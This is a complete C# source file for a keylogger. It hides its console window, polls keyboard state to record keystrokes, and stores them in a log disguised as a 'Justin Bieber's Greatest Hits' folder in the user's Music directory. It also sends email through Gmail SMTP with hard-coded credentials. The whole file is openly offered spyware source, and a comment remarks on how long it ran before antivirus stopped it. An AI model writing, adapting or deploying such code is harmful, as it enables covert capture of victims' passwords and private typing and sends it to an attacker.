using System;
using System.IO;
using System.Threading;
using System.Runtime.InteropServices;
using System.Net.Mail;
namespace KeyLogger
{
   // a simple keylogger - on my laptop the keylogger was stopped only after a few runs, although flagged already after the first run
    class Program
    {
        //GetConsoleWindow() returns the handle to window - which we can use with ShowWindow() and the 
        // value 0, to indicate we don't want the console to be shown - stealthy!
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        const string MY_EMAIL_ADDRESS = "loyalkeylogger@gmail.com";
        static void Main(string[] args)
        {
            ShowWindow(GetConsoleWindow(), 0);
           #if DEBUG
              return;
           #endif
            long wroteToLogCount = 0;
            string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) +
                @"\Justin Bieber's Greatest Hits\";
            if (!Directory.Exists(folderPath))
                Directory.CreateDirectory(folderPath);
            string pathToLog = @folderPath + "log";
            if (!File.Exists(pathToLog))
                File.CreateText(pathToLog);
            char[] keys = new char[10]; int keyStrokesCount = 0;
            string writeToLog;
            while (true)
            {
                Thread.Sleep(10); // so user will have time to type a key
                for(Int32 i = 32; i <= 127; i++ )
                {
                    // check if key was typed in the ASCII range
                    int keyState = GetAsyncKeyState(i);
                    if (keyState != 0) // from my experience, the keyState value of a recently typed key is 32678 or 32679
                    {
                        if (keyStrokesCount == 10)
                        {
                            // it wouldn't be efficient to write to log every time a key is typed...
                            writeToLog = String.Join("", keys);
                            using (StreamWriter sw = File.AppendText(pathToLog))
                            {
                                sw.WriteLine(writeToLog);
                            }
                            keyStrokesCount = 0;
                            wroteToLogCount++;
                            if(wroteToLogCount == 1000)
                            {
                                emailLog(pathToLog, wroteToLogCount);
                            }
                             

                        } 
                        keys[keyStrokesCount++] = (char)i;
                        Console.WriteLine(i);
                    }
                }
            }

        }
        static void emailLog(string pathToLog, long wroteToLogCount)
        {
            // from now on the code is pretty much self explanatory 
            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            client.DeliveryMethod = SmtpDeliveryMethod.Network;
            client.UseDefaultCredentials = false;
            client.Credentials = new System.Net.NetworkCredential("loyalkeylogger.com", "keylogger123");
            client.EnableSsl = true; // in the name of spookiness!
            MailMessage message = new MailMessage();
            message.From = new MailAddress("loyalkeylogger@gmail.com");
            message.To.Add(MY_EMAIL_ADDRESS);
            message.Subject = String.Format("Message #{0} from keyLogger", wroteToLogCount / 1000);
            string keyLoggerLifeStory = @"I'm just a keylogger, without a name, home or roots, how does it make 
            me feel you ask? free, although - not necessarily good.";
            message.Body = keyLoggerLifeStory;
            client.Send(message);
        }
    }
}